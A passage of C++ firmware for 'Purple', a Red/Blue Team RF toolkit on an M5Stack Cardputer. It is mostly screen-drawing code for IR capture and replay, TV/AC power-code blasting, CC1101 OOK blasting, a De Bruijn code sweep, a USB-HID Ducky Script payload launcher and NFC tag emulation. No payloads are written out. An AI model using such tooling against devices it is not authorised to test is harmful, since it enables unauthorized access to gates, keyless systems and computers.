        if (raw.valid) {
          irInit();
          irReplayRaw(raw);
          snprintf(msg, msgLen, "TX'd %d pulses", raw.count);
          f.close();
          return true;
        }
      }
      f.close();
      snprintf(msg, msgLen, "Raw load failed");
      return false;
    }
    f.close();
    snprintf(msg, msgLen, "Unknown IR file");
    return false;
  }
  f.close();

  IrRawCapture legacy = {};
  if (irLoadFromSd(path, legacy)) {
    irInit();
    irReplayRaw(legacy);
    snprintf(msg, msgLen, "TX'd %d pulses", legacy.count);
    return true;
  }
  snprintf(msg, msgLen, "Load failed");
  return false;
}

void drawIrRxScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println(g_irHasCapture ? "IR CAPTURED!" : "IR CAPTURE");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 32);
  M5.Display.printf("GPIO%d raw capture  SD:%d", kIrRxPin, g_irSdFileCount);

  if (g_irHasCapture) {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 46);
    M5.Display.printf("Captured: %d pulses", g_irRawCapture.count);

    // Try NEC decode for extra info
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 60);
    if (g_irLastReceived.valid) {
      M5.Display.printf("NEC Addr:0x%04X Cmd:0x%02X", g_irLastReceived.addr, g_irLastReceived.cmd);
    } else {
      M5.Display.printf("Protocol: raw (%d edges)", g_irRawCapture.count);
    }

    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 74);
    M5.Display.printf("Replays: %d  Attempts: %d", g_irRepeatCount, g_irRxAttempts);
    M5.Display.setCursor(14, 88);
    if (g_irSdMsg[0]) {
      M5.Display.setTextColor(kGold, kPanelAlt);
      M5.Display.printf("%.28s", g_irSdMsg);
    }

    M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
    M5.Display.setTextColor(kDimText, themeModeBg(mode));
    M5.Display.setCursor(4, 126);
    M5.Display.println("Ent=TX  Fn+S=listen  Fn+D=save  Fn+Bk=back");
  } else {
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 46);
    M5.Display.println("Aim remote at GPIO2 receiver");
    M5.Display.setCursor(14, 60);
    M5.Display.println("Press Ent to start 2s capture");
    const uint32_t elapsed = (millis() - g_irRxStartMs) / 1000;
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 74);
    M5.Display.printf("Attempts: %d  Time: %lus", g_irRxAttempts, elapsed);

    M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
    M5.Display.setTextColor(kDimText, themeModeBg(mode));
    M5.Display.setCursor(4, 126);
    M5.Display.println("Ent=capture  Fn+R=SD files  Fn+Bk=back");
  }
}

void drawIrSdReplayScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.print("IR SD REPLAY");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 86, 4, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 86, 4, accent);

  if (g_irSdFileCount == 0) {
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 46);
    M5.Display.println("No IR captures on SD.");
    M5.Display.setCursor(14, 60);
    M5.Display.println("Capture a signal first,");
    M5.Display.setCursor(14, 72);
    M5.Display.println("then press Fn+D to save.");
  } else {
    static constexpr int kVisible = 5;
    const int scroll = max(0, g_irSdFileSel - kVisible + 1);
    for (int i = 0; i < kVisible; ++i) {
      const int idx = scroll + i;
      if (idx >= g_irSdFileCount) break;
      const int  y   = 30 + i * 16;
      const bool sel = (idx == g_irSdFileSel);
      M5.Display.fillRect(12, y, 216, 14, sel ? accent : kPanelAlt);
      M5.Display.setTextColor(sel ? panel : kText, sel ? accent : kPanelAlt);
      const char* nm = strrchr(g_irSdFiles[idx], '/');
      nm = nm ? nm + 1 : g_irSdFiles[idx];
      M5.Display.setCursor(16, y + 3);
      M5.Display.printf("%-22.22s", nm);
    }
  }

  if (g_irSdMsg[0]) {
    M5.Display.fillRect(8, 114, 224, 10, kPanelAlt);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(12, 116);
    M5.Display.printf("%.36s", g_irSdMsg);
  }

  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(4, 126);
  M5.Display.print(";/.:pick Ent=TX Fn+D=del Fn+Bk=back");
}

void drawIrToolkitScreen(TeamMode mode) {
  switch (g_irState) {
    case IrState::Menu:      drawIrMenuScreen(mode);      break;
    case IrState::Blasting:  drawIrBlastScreen(mode);     break;
    case IrState::Receiving: drawIrRxScreen(mode);        break;
    case IrState::SdReplay:  drawIrSdReplayScreen(mode);  break;
    case IrState::Rename:
      drawIrSdReplayScreen(mode);
      drawRenameOverlay(mode);
      break;
  }
}

void tickIrBlast() {
  const IrCode* codes = g_irBlastAc ? kIrAcPowerCodes : kIrTvPowerCodes;
  const int total = g_irBlastAc ? kIrAcPowerCount : kIrTvPowerCount;
  irSendNec(codes[g_irBlastIndex % total].addr, codes[g_irBlastIndex % total].cmd);
  ++g_irBlastIndex;
  ++g_irBlastCount;
}

// ─────────────── RF Tools ───────────────

static const char* kRfToolsMenuItems[] = { "OOK Blast", "De Bruijn", "Raw IR TX" };
static const char* kOokPatterns[]       = { "AA (alt)", "FF (full)", "55 (inv)", "0F (ramp)" };
static const uint8_t kOokPatternBytes[] = { 0xAA, 0xFF, 0x55, 0x0F };
static const char* kDbBits[]            = { "8-bit", "10-bit", "12-bit" };
static const int   kDbBitVals[]         = { 8, 10, 12 };

void drawRfToolsMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("RF Tools");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(164, 8);
  M5.Display.printf("IR%d CC1101", kIrTxPin);

  for (int i = 0; i < 3; ++i) {
    const int y = 30 + i * 16;
    const bool sel = (i == g_rfToolsMenuSel);
    M5.Display.fillRect(8, y, 224, 14, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setTextColor(sel ? accent : kText, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setCursor(14, y + 3);
    M5.Display.print(sel ? "> " : "  ");
    M5.Display.print(kRfToolsMenuItems[i]);
    if (i == 0) M5.Display.printf("  [%sMHz %s]", g_cc1101Bands[g_ookBandIndex], kOokPatterns[g_ookPatternSel]);
    if (i == 1) M5.Display.printf("  [%sMHz %s]", g_cc1101Bands[g_dbBandIndex], kDbBits[g_dbCodeBits == 8 ? 0 : g_dbCodeBits == 10 ? 1 : 2]);
    if (i == 2) M5.Display.printf("  [%04X/%02X]", g_rawIrAddr, g_rawIrCmd);
  }

  M5.Display.fillRect(8, 80, 224, 44, kPanelAlt);
  M5.Display.drawRoundRect(8, 80, 224, 44, 5, accent);
  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 86);
  if (g_rfToolsMenuSel == 0) M5.Display.println("Send repeating OOK pattern via CC1101");
  if (g_rfToolsMenuSel == 1) M5.Display.println("LFSR sweep — hits all N-bit codes");
  if (g_rfToolsMenuSel == 2) M5.Display.println("Send custom NEC IR on G44");
  M5.Display.setCursor(14, 100);
  M5.Display.println("Fn+S cfg  Ent start  Fn+Bk");
  M5.Display.drawFastHLine(8, 118, 224, accent);
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 120);
  M5.Display.println("Fn+;/. sel  Ent run");
}

void drawOokTxScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("OOK BLAST");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  const int phase = (g_ookBurstCount * 7) % 400;
  M5.Display.fillRect(14, 30, (phase <= 200 ? phase : 400-phase) * 212 / 200, 4, accent);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 42);
  M5.Display.printf("Band:    %s MHz", g_cc1101Bands[g_ookBandIndex]);
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 56);
  M5.Display.printf("Pattern: 0x%02X (%s)", kOokPatternBytes[g_ookPatternSel], kOokPatterns[g_ookPatternSel]);
  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 70);
  M5.Display.printf("Bursts:  %d", g_ookBurstCount);
  M5.Display.setCursor(14, 84);
  M5.Display.printf("Elapsed: %lus", (millis() - g_ookStartMs) / 1000);
  M5.Display.setCursor(14, 98);
  M5.Display.println("2.4kbps OOK via CC1101");

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("BLASTING...  Fn+Bk=stop");
}

void drawDeBruijnScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("DE BRUIJN");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  const int phase = (g_dbBurstCount * 5) % 400;
  M5.Display.fillRect(14, 30, (phase <= 200 ? phase : 400-phase) * 212 / 200, 4, accent);

  const int totalCodes = 1 << g_dbCodeBits;
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 42);
  M5.Display.printf("Band:   %s MHz", g_cc1101Bands[g_dbBandIndex]);
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 56);
  M5.Display.printf("Code:   %d-bit  (%d combos)", g_dbCodeBits, totalCodes);
  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 70);
  M5.Display.printf("Bursts: %d", g_dbBurstCount);
  M5.Display.setCursor(14, 84);
  M5.Display.printf("LFSR:   0x%04X", (unsigned)g_dbLfsrState);
  M5.Display.setCursor(14, 98);
  M5.Display.printf("Elapsed: %lus", (millis() - g_dbStartMs) / 1000);

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("SWEEPING...  Fn+Bk=stop");
}

void drawRawIrTxScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("RAW IR TX");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  // Addr field
  const bool addrSel = (g_rawIrField == 0);
  M5.Display.fillRoundRect(14, 34, 96, 20, 3, addrSel ? accent : kPanelAlt);
  M5.Display.setTextColor(addrSel ? themeModeBg(mode) : kText, addrSel ? accent : kPanelAlt);
  M5.Display.setCursor(18, 40);
  M5.Display.printf("Addr: 0x%04X", g_rawIrAddr);

  // Cmd field
  const bool cmdSel = (g_rawIrField == 1);
  M5.Display.fillRoundRect(118, 34, 108, 20, 3, cmdSel ? accent : kPanelAlt);
  M5.Display.setTextColor(cmdSel ? themeModeBg(mode) : kText, cmdSel ? accent : kPanelAlt);
  M5.Display.setCursor(122, 40);
  M5.Display.printf("Cmd:  0x%02X", g_rawIrCmd);

  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 64);
  M5.Display.println("NEC protocol  G44 built-in TX");
  M5.Display.setCursor(14, 78);
  M5.Display.printf("Sent: %d times", g_rawIrSendCount);

  // Brand lookup
  const char* brand = nullptr;
  for (int i = 0; i < kIrTvPowerCount && !brand; ++i)
    if (kIrTvPowerCodes[i].addr == g_rawIrAddr) brand = kIrTvPowerCodes[i].label;
  for (int i = 0; i < kIrAcPowerCount && !brand; ++i)
    if (kIrAcPowerCodes[i].addr == g_rawIrAddr) brand = kIrAcPowerCodes[i].label;
  M5.Display.setCursor(14, 92);
  M5.Display.printf("Brand: %s", brand ? brand : "unknown");

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+;/. val  Fn+S=field  Ent=send");
}

void drawRfToolsScreen(TeamMode mode) {
  switch (g_rfToolsState) {
    case RfToolsState::Menu:      drawRfToolsMenuScreen(mode); break;
    case RfToolsState::OokTx:     drawOokTxScreen(mode);       break;
    case RfToolsState::DeBruijnTx:drawDeBruijnScreen(mode);    break;
    case RfToolsState::RawIrTx:   drawRawIrTxScreen(mode);     break;
  }
}

// ─────────────── Payloads (USB-HID / Ducky Script file browser) ──────────────

void drawPayloadsScreen(TeamMode mode) {
  constexpr int kVisible = 5;
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Payloads");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(174, 8);
  M5.Display.println("USB-HID");

  if (g_plState == PayloadState::Running) {
    M5.Display.fillRoundRect(8, 26, 224, 80, 3, kPanelAlt);
    M5.Display.drawRoundRect(8, 26, 224, 80, 3, accent);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 34);
    M5.Display.println("INJECTING...");
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 50);
    if (g_plFileSel < g_plFileCount)
      M5.Display.printf("%.28s", plBasename(g_plFiles[g_plFileSel]));
    return;
  }

  if (g_plState == PayloadState::Done) {
    M5.Display.fillRoundRect(8, 26, 224, 80, 3, kPanelAlt);
    M5.Display.drawRoundRect(8, 26, 224, 80, 3, accent);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 34);
    M5.Display.println(g_plLastError[0] ? "ERROR" : "DONE");
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 50);
    if (g_plLastError[0])
      M5.Display.printf("%.28s", g_plLastError);
    else
      M5.Display.printf("%d lines injected", g_plLinesRun);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 66);
    M5.Display.println("Ent=run again  Fn+Bk=back");
    return;
  }

  if (g_plState == PayloadState::NoCard || g_plFileCount == 0) {
    M5.Display.fillRoundRect(8, 26, 224, 80, 3, kPanelAlt);
    M5.Display.drawRoundRect(8, 26, 224, 80, 3, accent);
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(14, 34);
    M5.Display.println(g_plState == PayloadState::NoCard ? "No SD card" : "No .txt files found");
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 50);
    M5.Display.println("Put .txt Ducky Scripts in");
    M5.Display.setCursor(14, 62);
    M5.Display.println("/payloads/ on SD card");
    M5.Display.setCursor(14, 74);
    M5.Display.println("Fn+R=rescan");
    return;
  }

  // File list
  for (int i = 0; i < kVisible; ++i) {
    const int idx = g_plFileScroll + i;
    if (idx >= g_plFileCount) break;
    const int  y   = 26 + i * 16;
    const bool sel = (idx == g_plFileSel);
    M5.Display.fillRect(8, y, 224, 15, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setTextColor(sel ? accent : kText, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setCursor(14, y + 4);
    M5.Display.printf("%.30s", plBasename(g_plFiles[idx]));
  }
  M5.Display.fillRect(8, 112, 224, 12, themeModeBg(mode));
  M5.Display.drawFastHLine(8, 112, 224, accent);
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 122);
  M5.Display.println("Fn+;/. sel Ent run Fn+R");
}

// ─────────────── Config / Settings ───────────────

void drawConfigMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  constexpr int kCfgItems = static_cast<int>(sizeof(kCfgItemLabels) / sizeof(kCfgItemLabels[0]));
  constexpr int kVisibleRows = 6;
  int scroll = 0;
  if (g_cfgMenuSel >= kVisibleRows) scroll = g_cfgMenuSel - kVisibleRows + 1;
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Config");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(168, 8);
  M5.Display.println("Fn+S prev  Fn+R next");

  for (int row = 0; row < kVisibleRows; ++row) {
    const int i = scroll + row;
    if (i >= kCfgItems) break;
    const int y = 26 + row * 14;
    const bool sel = (i == g_cfgMenuSel);
    M5.Display.fillRect(8, y, 224, 13, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setTextColor(sel ? accent : kText, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setCursor(14, y + 3);
    M5.Display.printf("%-11s", kCfgItemLabels[i]);
    M5.Display.setTextColor(sel ? kGold : kDimText, sel ? kPanelAlt : themeModeBg(mode));
    switch (i) {
      case 0: M5.Display.printf("%d", g_cfgBrightness);                             break;
      case 1: M5.Display.print(g_cfgStartTeam == 0 ? "Red" : "Blue");               break;
      case 2: M5.Display.print(kBleNamePresets[g_cfgBleName]);                       break;
      case 3: M5.Display.print(kOokRateLabels[g_cfgOokRate]);                        break;
      case 4: M5.Display.printf("%s MHz", g_cc1101Bands[g_cfgDefaultBand]);          break;
      case 5: M5.Display.print(kCapRssiLabels[g_cfgCaptureRssi]);                    break;
      case 6: M5.Display.print(kNfcTimeoutLabels[g_cfgNfcTimeout]);                  break;
      case 7: M5.Display.print(kGpsUnitsLabels[g_cfgGpsUnits]);                      break;
      case 8: M5.Display.print("open");                                               break;
    }
  }

  M5.Display.fillRect(8, 112, 224, 12, themeModeBg(mode));
  M5.Display.drawFastHLine(8, 112, 224, accent);
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 122);
  M5.Display.println("Fn+;/. nav Fn+S/Fn+R Ent");
}

void drawAboutScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("About Purple");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 32);
  M5.Display.println("Purple  Red/Blue RF Toolkit");
  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 42);
  M5.Display.println("ESP32-S3  M5Stack Cardputer");

  const Cc1101ProbeResult cc = hardwareProbeCc1101();
  const Nrf24ProbeResult  nf = hardwareProbeNrf24();

  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 54);
  M5.Display.printf("CC1101: %s", cc.present ? "OK" : "not found");
  if (cc.present) M5.Display.printf("  v%02X", cc.version);

  M5.Display.setCursor(14, 64);
  M5.Display.printf("nRF24:  %s", nf.present ? "OK" : "not found");
  if (nf.present) M5.Display.printf("  st:%02X", nf.status);

  M5.Display.setCursor(14, 74);
  M5.Display.printf("Profile: %s", hardwareProfileName());

  M5.Display.setCursor(14, 84);
  M5.Display.printf("RAM free: %lu B", (unsigned long)ESP.getFreeHeap());

  M5.Display.setCursor(14, 94);
  M5.Display.printf("Build: %s", __DATE__);

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+Bk=back");
}

void drawConfigScreen(TeamMode mode) {
  if (g_cfgAbout) drawAboutScreen(mode);
  else            drawConfigMenuScreen(mode);
}

// ─────────────────────────────────────────────────────

const char* detailLine1(AppId appId) {
  switch (appId) {
    case AppId::WifiOps:
      return "Active WiFi operator toolkit";
    case AppId::BleOps:
      return "BLE discovery and operator tools";
    case AppId::IrToolkit:
      return "IR send / save / replay";
    case AppId::Payloads:
      return "USB payload launcher bucket";
    case AppId::Cc1101Ops:
      return "Sub-GHz capture and replay";
    case AppId::Nrf24Ops:
      return "2.4 GHz ops and sniffing";
    case AppId::RfTools:
      return "Extra RF utilities bucket";
    case AppId::FieldNotes:
      return "Quick operator note pad";
    case AppId::Files:
      return "Storage browser and loaders";
    case AppId::Settings:
      return "System and radio settings";
    case AppId::WifiMonitor:
      return "Wireless watch and visibility";
    case AppId::BleMonitor:
      return "BLE threat and device watch";
    case AppId::GpsMonitor:
      return "GPS status, track, and wardrive";
    case AppId::Cc1101Scan:
      return "Sub-GHz scan and signal checks";
    case AppId::NrfAnalyzer:
      return "nRF traffic and spectrum review";
    case AppId::Alerts:
      return "Watchlist and alert center";
    case AppId::Logs:
      return "Captured events and history";
    case AppId::DeviceHealth:
      return "Storage, battery, and module status";
    case AppId::ResponseNotes:
      return "Incident response notes";
  }
  return "";
}

const char* detailLine2(AppId appId) {
  switch (appId) {
    case AppId::WifiOps:
      return "Scan, sort, inspect, target";
    case AppId::BleOps:
      return "Scan, score, inspect, target";
    case AppId::IrToolkit:
      return "Planned: presets and raw TX";
    case AppId::Payloads:
      return "Planned: script categories";
    case AppId::Cc1101Ops:
      return "Planned: detect, RX, replay";
    case AppId::Nrf24Ops:
      return "Planned: scan, sniff, analyze";
    case AppId::RfTools:
      return "Planned: helpers and testing";
    case AppId::FieldNotes:
      return "Planned: fast text capture";
    case AppId::Files:
      return "Browse internal flash and SD";
    case AppId::Settings:
      return "Planned: mode and device prefs";
    case AppId::WifiMonitor:
      return "Planned: passive watch views";
    case AppId::BleMonitor:
      return "Scan, score, inspect, rescan";
    case AppId::GpsMonitor:
      return "Status, tracker, wardrive logs";
    case AppId::Cc1101Scan:
      return "Planned: signal snapshots";
    case AppId::NrfAnalyzer:
      return "Planned: channel insight";
    case AppId::Alerts:
      return "Planned: notable event flags";
    case AppId::Logs:
      return "Planned: timeline and exports";
    case AppId::DeviceHealth:
      return "Battery and storage status";
    case AppId::ResponseNotes:
      return "Planned: response workflow notes";
  }
  return "";
}

const char* detailLine3(AppId appId) {
  if (!hardwareProfileSupportsApp(appId)) {
    return hardwareAppRequirement(appId);
  }
  switch (appId) {
    case AppId::Cc1101Ops:
    case AppId::Cc1101Scan:
    case AppId::Nrf24Ops:
    case AppId::NrfAnalyzer:
    case AppId::GpsMonitor:
      return hardwareProfileHint();
    default:
      return "";
  }
}

}  // namespace

const AppEntry* getAppsForMode(TeamMode mode, int& count) {
  if (mode == TeamMode::Red) {
    count = static_cast<int>(sizeof(kRedApps) / sizeof(kRedApps[0]));
    return kRedApps;
  }
  count = static_cast<int>(sizeof(kBlueApps) / sizeof(kBlueApps[0]));
  return kBlueApps;
}

const char* getModeName(TeamMode mode) {
  return mode == TeamMode::Red ? "Red Team" : "Blue Team";
}

const char* getModeSubtitle(TeamMode mode) {
  return mode == TeamMode::Red ? "ops" : "mon";
}

AppId getPairedAppForTeam(AppId appId, TeamMode targetMode) {
  switch (appId) {
    case AppId::WifiOps:
    case AppId::WifiMonitor:
      return targetMode == TeamMode::Red ? AppId::WifiOps : AppId::WifiMonitor;
    case AppId::BleOps:
    case AppId::BleMonitor:
      return targetMode == TeamMode::Red ? AppId::BleOps : AppId::BleMonitor;
    case AppId::GpsMonitor:
      return targetMode == TeamMode::Red ? AppId::IrToolkit : AppId::GpsMonitor;
    case AppId::Cc1101Ops:
    case AppId::Cc1101Scan:
      return targetMode == TeamMode::Red ? AppId::Cc1101Ops : AppId::Cc1101Scan;
    case AppId::Nrf24Ops:
    case AppId::NrfAnalyzer:
      return targetMode == TeamMode::Red ? AppId::Nrf24Ops : AppId::NrfAnalyzer;
    case AppId::FieldNotes:
    case AppId::ResponseNotes:
      return targetMode == TeamMode::Red ? AppId::FieldNotes : AppId::ResponseNotes;
    case AppId::Files:
      return AppId::Files;
    case AppId::Settings:
      return AppId::Settings;
    case AppId::RfTools:
    case AppId::Alerts:
      return targetMode == TeamMode::Red ? AppId::RfTools : AppId::Alerts;
    case AppId::Payloads:
    case AppId::Logs:
      return targetMode == TeamMode::Red ? AppId::Payloads : AppId::Logs;
    case AppId::IrToolkit:
    case AppId::DeviceHealth:
      return targetMode == TeamMode::Red ? AppId::IrToolkit : AppId::DeviceHealth;
  }
  return appId;
}

static void drawNfcScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  const uint16_t bg     = themeModeBg(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(bg);
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.print("NFC");
  M5.Display.setTextColor(accent, panel);
  M5.Display.print(" SCANNER");
  drawBatteryWidget(panel, 132);

  if (g_nfcView == NfcView::Menu) {
    static const char* kNfcMenuItems[] = {"Scan Tag", "Emulate Saved"};
    for (int i = 0; i < 2; ++i) {
      const int y = 26 + i * 15;
      const bool sel = (i == g_nfcMenuSel);
      M5.Display.fillRect(8, y, 224, 14, sel ? kPanelAlt : bg);
      M5.Display.setTextColor(sel ? accent : kText, sel ? kPanelAlt : bg);
      M5.Display.setCursor(14, y + 3);
      M5.Display.print(sel ? "> " : "  ");
      M5.Display.print(kNfcMenuItems[i]);
      if (i == 1) M5.Display.printf(" (%d)", g_nfcSdFileCount);
    }
    M5.Display.fillRect(8, 56, 224, 59, kPanelAlt);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 74);
    M5.Display.println("PN532 via I2C (G8=SDA G9=SCL)");
    M5.Display.setCursor(14, 86);
    M5.Display.printf("Saved: %d tags on SD", g_nfcSdFileCount);
    M5.Display.setCursor(14, 98);
    M5.Display.printf("Last: %s", g_nfcLastTag.valid ? g_nfcLastTag.typeStr : "none");
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(4, 127);
    M5.Display.print("Ent sel ;/. nav Fn+Bk");

  } else if (g_nfcView == NfcView::Scanning) {
    M5.Display.fillRoundRect(8, 26, 224, 86, 6, kPanelAlt);
    M5.Display.drawRoundRect(8, 26, 224, 86, 6, accent);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 32);
    M5.Display.println("SCANNING FOR NFC TAG...");
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 50);
    M5.Display.printf("Hold tag near module");
    M5.Display.setCursor(14, 64);
